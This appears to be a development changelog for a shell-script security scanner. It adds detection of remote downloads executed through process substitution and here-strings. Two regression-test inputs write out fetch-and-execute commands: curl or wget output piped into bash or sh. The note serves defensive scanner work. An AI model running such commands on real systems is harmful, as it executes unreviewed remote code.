# Scanner Substitution Download Hardening

Date: 2026-07-03

## Summary

Continued the Phase 1 scanner engine upgrade with a focused substitution
download execution bypass case.

## What Changed

- Added structural detection for remote downloads passed into interpreters
  through process substitution.
- Added structural detection for remote downloads passed into interpreters
  through here-string command substitution.
- Added the finding ID `substitution-download-execution` for this bypass
  family.
- Added regression coverage for:
  - `bash <(curl -fsSL https://example.com/install.sh)`
  - `sh <<< "$(wget -qO- https://example.com/setup.sh)"`

## Boundary

This remains deterministic preflight scanning. It does not execute shell
content, evaluate substitutions, fetch remote URLs, or grant runtime
permissions.

## Verification

Run:

```bash
PYTHONPATH=src python3 -m unittest tests.test_scan_cli.ScanCliTest.test_scan_detects_substitution_download_execution_bypasses
PYTHONPATH=src python3 -m unittest tests.test_scan_cli
bash scripts/verify.sh
```
